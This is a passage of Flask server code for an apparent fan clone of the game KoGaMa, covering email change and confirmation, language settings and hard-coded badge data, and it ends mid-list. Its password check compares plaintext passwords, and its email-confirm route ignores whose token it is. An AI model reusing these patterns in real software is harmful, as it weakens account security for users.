        abort(401)
    data = request.get_json(silent=True) or {}
    email = str(data.get('email', '')).strip()
    password = str(data.get('password', ''))
    if current_user.password == password:
        if email == "":
            current_user.email = ""
            current_user.email_confirmed = 0
            db.session.commit()
            return jsonify({'__all__': ['Email updated. Please check your email to confirm it.']}), 200
        existing_email = db.session.query(User).filter(
            func.lower(User.email) == func.lower(email)
        ).first()
        if existing_email:
            return jsonify({'error': {'__all__': ['Email already in use.']}}), 400
        current_user.email = email
        db.session.commit()
        token = generate_confirmation_token(current_user.id, email)
        confirm_url = url_for('confirm_email_update', token=token, _external=True)
        html = render_template_string("""
        <div style="font-family:'Open Sans',sans-serif;max-width:600px;font-size:1.15em">
        <div style="padding:1em;display:flex">
         <div style="padding:1em;border-radius:5px;background-color:#f5f7fa;text-align:center">
            <a href="https://helperskogama-hftp.pythonanywhere.com/?utm_source=base_mail&utm_medium=email" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://helperskogama-hftp.pythonanywhere.com/&amp;source=gmail&amp;ust=1780697688691000&amp;usg=AOvVaw3a9zXGBRqNRxNDBLF_r0sf"><img src="https://web.archive.org/web/20250307084042im_/https://www.kogama.com/static/img/logo_bluewhite_7.png" alt="KaGaMa Logo" style="margin:auto;display:block" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0."></a>
            <h1>{{ current_user.username }}</h1>
            <p>Confirm your email address!<br>Simply press the button below.</p>
            <p><a href="{{ confirm_url }}">Confirm your email</a></p>
            <p>If that doesn't work, copy and paste the following link in your browser:<br><a href="{{ confirm_url }}">{{ confirm_url }}</a> </p>
            <p>If you have any questions, just reply to this email—we're always happy to help out.</p>
            <p>Cheers,<br><a href="https://helperskogama-hftp.pythonanywhere.com/help/?utm_source=base_email&utm_medium=email">Kagama Team</a></p>
         </div>
        </div>
        <img src="https://web.archive.org/web/20250930151609/https://static.kogstatic.com/0000/4114900ac15ce37670f850856bfaecdcb20d888d/a14cb897a5d8c2491ef23b513ba8e022.jpg" height="1" width="1" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0.">
        </div>
        """,
            confirm_url=confirm_url
        )
        msg = Message(
            subject="KaGaMa Games: Email Confirmation",
            recipients=[email],
            html=html
        )
        mail.send(msg)
        return jsonify({'__all__': ['Email updated. Please check your email to confirm it.']}), 200
    else:
        return jsonify({'error': {'__all__': ['Password is incorrect.']}}), 400

@app.route('/user/<int:user_id>/email-confirm/', methods=['PUT'])
def email_confirm(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    email = current_user.email
    if email == "":
        current_user.email = ""
        current_user.email_confirmed = 0
        db.session.commit()
        return jsonify({'__all__': ['Email updated. Please check your email to confirm it.']}), 200
    current_user.email = email
    current_user.email_confirmed = 0
    db.session.commit()
    token = generate_confirmation_token(current_user.id, email)
    confirm_url = url_for('confirm_email_update', token=token, _external=True)
    html = render_template_string("""
    <div style="font-family:'Open Sans',sans-serif;max-width:600px;font-size:1.15em">
    <div style="padding:1em;display:flex">
     <div style="padding:1em;border-radius:5px;background-color:#f5f7fa;text-align:center">
        <a href="https://helperskogama-hftp.pythonanywhere.com/?utm_source=base_mail&utm_medium=email" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://helperskogama-hftp.pythonanywhere.com/&amp;source=gmail&amp;ust=1780697688691000&amp;usg=AOvVaw3a9zXGBRqNRxNDBLF_r0sf"><img src="https://web.archive.org/web/20250307084042im_/https://www.kogama.com/static/img/logo_bluewhite_7.png" alt="KaGaMa Logo" style="margin:auto;display:block" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0."></a>
        <h1>{{ current_user.username }}</h1>
        <p>Confirm your email address!<br>Simply press the button below.</p>
        <p><a href="{{ confirm_url }}">Confirm your email</a></p>
        <p>If that doesn't work, copy and paste the following link in your browser:<br><a href="{{ confirm_url }}">{{ confirm_url }}</a> </p>
        <p>If you have any questions, just reply to this email—we're always happy to help out.</p>
        <p>Cheers,<br><a href="https://helperskogama-hftp.pythonanywhere.com/help/?utm_source=base_email&utm_medium=email">Kagama Team</a></p>
     </div>
    </div>
    <img src="https://web.archive.org/web/20250930151609/https://static.kogstatic.com/0000/4114900ac15ce37670f850856bfaecdcb20d888d/a14cb897a5d8c2491ef23b513ba8e022.jpg" height="1" width="1" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0.">
    </div>
    """,
        confirm_url=confirm_url
    )
    msg = Message(
        subject="KaGaMa: Email Confirmation",
        recipients=[email],
        html=html
    )
    mail.send(msg)
    return jsonify({'__all__': ['Email updated. Please check your email to confirm it.']}), 200

@app.route('/email-confirm/<token>/', methods=['GET'])
def confirm_email_update(token):
    payload = verify_confirmation_token(token)
    if not payload:
        return redirect(url_for('home'))
    if current_user.is_authenticated:
        current_user.email_confirmed = 1
        db.session.commit()
    return redirect(url_for('home'))

@app.route('/user/<int:user_id>/pulse/', methods=['POST'])
def send_pulse_data(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    location = str(data.get('location'))
    status = str(data.get('status'))
    if location and status:
        if status == "active":
            current_user.location = location
        db.session.commit()
        return jsonify([]), 200
    return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400

@app.route('/user/<int:user_id>/language/', methods=['GET', 'PUT'])
def access_user_language(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
        return jsonify({'language': current_user.language}), 200
    data = request.get_json(silent=True) or {}
    user_language = str(data.get('language', 'en_US')).strip()
    current_user.language = user_language
    db.session.commit()
    return jsonify({'language': user_language}), 200

@app.route('/user/<int:user_id>/level_badge/', methods=['GET'])
def access_user_level_badges(user_id):
    user = db.session.get(User, user_id)
    return jsonify({
        "data": [{
            "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a.png"
            },
            "name": "Turtle",
            "has_level": 1 if user and user._level > 0 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4.png"
              },
              "name": "Cat",
              "has_level": 1 if user and user._level > 5 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bf/92/bf924d0e65b84109b44a8da8e0fa2061.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bf/92/bf924d0e65b84109b44a8da8e0fa2061.png"
              },
              "name": "Wolf",
              "has_level": 1 if user and user._level > 10 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ee/19/ee19969ed2c145df8da230e8709e3736.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ee/19/ee19969ed2c145df8da230e8709e3736.png"
              },
              "name": "Spider",
              "has_level": 1 if user and user._level > 15 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/28/82/288274b84dfb4882bb4eb87e9c1a6ff8.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/28/82/288274b84dfb4882bb4eb87e9c1a6ff8.png"
              },
              "name": "Unicorn",
              "has_level": 1 if user and user._level > 20 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/63/01/63015089-ab42-4ad9-9043-46386f3edd59.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/63/01/63015089-ab42-4ad9-9043-46386f3edd59.png"
              },
              "name": "Ghost",
              "has_level": 1 if user and user._level > 25 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81.png"
              },
              "name": "Demon",
              "has_level": 1 if user and user._level > 30 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21.png"
              },
              "name": "Eagle",
              "has_level": 1 if user and user._level > 35 else 0
            },
            {
              "images": {
                "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_16x16.jpg",
                "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_32x32.jpg",
                "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_64x64.jpg",
                "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/57/5d/575d964bfc3e4e3a9e835c2735ba9661.png",
                "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/57/5d/575d964bfc3e4e3a9e835c2735ba9661.png"
              },
              "name": "Furious Force",
              "has_level": 1 if user and user._level > 40 else 0
            }
        ]}), 200

@app.route('/user/<int:user_id>/new_level_badge/', methods=['GET'])
def access_new_level_badges(user_id):
    user = db.session.get(User, user_id)
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    if user.notified_of_new_level == 1:
        return jsonify({}), 200
    if user._level > 1 and user._level < 6:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/da/0b/da0b66cec4b34187a6dd8d5ff4566c0a.png"
                },
                "name": "Turtle",
            }
            ]}), 200
    elif user._level > 5 and user._level < 11:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ac/d7/acd7b2242dbc48faa6fefa12b36bcbf4.png"
                },
                "name": "Cat",
            }
            ]}), 200
    elif user._level > 10 and user._level < 16:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bf/92/bf924d0e65b84109b44a8da8e0fa2061_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bf/92/bf924d0e65b84109b44a8da8e0fa2061.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bf/92/bf924d0e65b84109b44a8da8e0fa2061.png"
                },
                "name": "Wolf",
            }
            ]}), 200
    elif user._level > 15 and user._level < 21:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ee/19/ee19969ed2c145df8da230e8709e3736_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ee/19/ee19969ed2c145df8da230e8709e3736.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ee/19/ee19969ed2c145df8da230e8709e3736.png"
                },
                "name": "Spider",
            }
            ]}), 200
    elif user._level > 20 and user._level < 26:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/28/82/288274b84dfb4882bb4eb87e9c1a6ff8_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/28/82/288274b84dfb4882bb4eb87e9c1a6ff8.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/28/82/288274b84dfb4882bb4eb87e9c1a6ff8.png"
                },
                "name": "Unicorn",
            }
            ]}), 200
    elif user._level > 25 and user._level < 31:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/63/01/63015089-ab42-4ad9-9043-46386f3edd59_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/63/01/63015089-ab42-4ad9-9043-46386f3edd59.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/63/01/63015089-ab42-4ad9-9043-46386f3edd59.png"
                },
                "name": "Ghost",
            }
            ]}), 200
    elif user._level > 30 and user._level < 36:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9e/03/9e03afc6-82d7-4dc8-a27b-50dbe42bac81.png"
                },
                "name": "Demon",
            }
            ]}), 200
    elif user._level > 35 and user._level < 41:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/15/d4/15d4e46d-e2f3-4f39-8bc5-386097b57c21.png"
                },
                "name": "Eagle",
            }
            ]}), 200
    elif user._level > 40:
        user.notified_of_new_level = 1
        db.session.commit()
        return jsonify({
            "data": [{
                "images": {
                    "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_16x16.jpg",
                    "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_32x32.jpg",
                    "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/57/5d/575d964bfc3e4e3a9e835c2735ba9661_64x64.jpg",
                    "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/57/5d/575d964bfc3e4e3a9e835c2735ba9661.png",
                    "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/57/5d/575d964bfc3e4e3a9e835c2735ba9661.png"
                },
                "name": "Furious Force",
            }
            ]}), 200
    else:
        user.notified_of_new_level = 0
        db.session.commit()
        return jsonify({}), 200

@app.route('/user/<int:user_id>/badge/', methods=['GET'])
def access_user_badges(user_id):
    user = db.session.get(User, user_id)
    badge_data = {"data": []}
    notown_args = request.args.get('notown', default=None, type=str)
    if notown_args == "true":
        badge_data = {
        "data": [{
          "id": 86,
          "name": "Elite",
          "created": "2019-01-09T08:40:43+00:00",
          "updated": "2019-01-09T08:40:43+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_64x64.jpg",
          "group_name": "elite_puchase",
          "group_priority": None,
          "reward_id": None,
          "seen": False,
          "owns": False,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/6a/966a5270-3b7b-4ab7-9d91-91822289867d_64x64.jpg"
          }
        },
        {
          "id": 89,
          "name": "Bag of gold",
          "created": "2019-01-16T12:12:55+00:00",
          "updated": "2020-01-12T22:40:39+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_64x64.jpg",
          "group_name": "gold_purchase",
          "group_priority": 2,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 1900 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/95/6c/956c626b-6980-423b-923c-6b24a08e65dd_64x64.jpg"
          }
        },
        {
          "id": 80,
          "name": "Barrel of Gold",
          "created": "2018-11-27T10:36:40+00:00",
          "updated": "2020-01-12T22:41:57+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_64x64.jpg",
          "group_name": "gold_purchase",
          "group_priority": 3,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 4700 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/12/09/120961f2-bc85-4d9c-a93f-36af01efac72_64x64.jpg"
          }
        },
        {
          "id": 29,
          "name": "Cart of Gold",
          "created": "2015-08-20T11:11:06+00:00",
          "updated": "2020-01-12T22:43:04+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_64x64.jpg",
          "group_name": "gold_purchase",
          "group_priority": 5,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 9500 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/c8/fa/c8fae1af-e8b2-4735-91a7-112d8da808c5_64x64.jpg"
          }
        },
        {
          "id": 30,
          "name": "Vault of Gold",
          "created": "2015-08-20T11:11:43+00:00",
          "updated": "2020-01-12T22:42:36+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_64x64.jpg",
          "group_name": "gold_purchase",
          "group_priority": 6,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 20000 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/e2/14/e214b8a2-c72b-4e9f-a8ce-2b39c2a6578d_64x64.jpg"
          }
        },
        {
          "id": 3,
          "name": "Tower of Gold",
          "created": "2013-02-16T12:44:34+00:00",
          "updated": "2023-06-06T12:32:50+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_64x64.jpg",
